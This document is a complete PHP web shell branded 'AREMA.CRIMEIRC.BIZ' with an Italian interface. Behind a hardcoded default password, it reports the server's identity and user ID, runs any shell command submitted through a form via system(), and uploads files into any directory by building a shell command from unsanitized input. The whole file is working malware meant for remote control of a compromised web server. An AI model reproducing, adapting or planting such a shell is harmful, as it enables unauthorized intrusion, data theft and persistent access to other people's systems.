<?
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "masuk";    // default password for nstview, you can change it.
#####end#####

$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
else $ip = $_SERVER['REMOTE_ADDR'];
$ip=htmlspecialchars($ip);

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<title>.:: Scanner.homelinux.net ::.</title>
<center>
<table width=100 bgcolor=#000000 border=6 bordercolor=#00ff00><tr><td>
<font size=1 face=verdana color=#00ff00><strong><center> AREMA.CRIMEIRC.BIZ </center></strong><br>
<center><strong><b>By Arage</b></strong></center>
</center>
<form method=post>
Password:<br>
<input type=password name=pass size=30 tabindex=1>
</form>
<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>
<b>Your ip:</b> ".$ip."
</td></tr></table>
");}

}

?>
<?php

set_magic_quotes_runtime(0);


print "<style>body{font-family:
trebuchet ms;
font-size:
16px;
}hr{width:
100%;height:
2px;
}</style>";

print "<center><h1>.:: AREMA.CRIMEIRC.BIZ ::.</h1></center>";

print "<center><h3>  By ARAGE  </h3></center>";

print "<hr><hr>";


$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);

$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);


$UName  = `uname -a`;
$SCWD   = `pwd`;

$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";

print "<tr><td><b>Il Tuo IP:
</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";

print "<tr><td><b>Server:</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";

print "<tr><td><b>Sistema Operativo:</b></td><td>$UName</td></tr>";

print "<tr><td><b>I Tuoi Accessi:</b></td><td>$UserID</td></tr>";

print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "Lista la Dir!" ) {
    $currentCMD = "ls -la";
}


print "<form method=post enctype=\"multipart/form-data\"><table>";


print "<tr><td><b>Esegui comando:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";

print "<td><input type=submit name=_act value=\"Esegui!\"></td></tr>";


print "<tr><td><b>Cambia directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";

print "<td><input type=submit name=_act value=\"Lista la Dir!\"></td></tr>";


print "<tr><td><b>Uppa un file:</b></td><td><input size=85 type=file name=_upl></td>";

print "<td><input type=submit name=_act value=\"Uppa!\"></td></tr>";


print "</table></form><hr><hr>";


$currentCMD = str_replace("\\\"","\"",$currentCMD);

$currentCMD = str_replace("\\\'","\'",$currentCMD);


if( $_POST['_act'] == "Uppa!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Errore durante l'upload!</b></center>";
    } else {
        print "<center><pre>";

        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");

        print "</pre><b>File uppato senza problemi!</b></center>";

    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";

    $currentCMD = "cd ".$currentWD.";".$currentCMD;

    system($currentCMD);

    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Comando completato Con Sucesso!!</b></center>";
}

exit;

?>

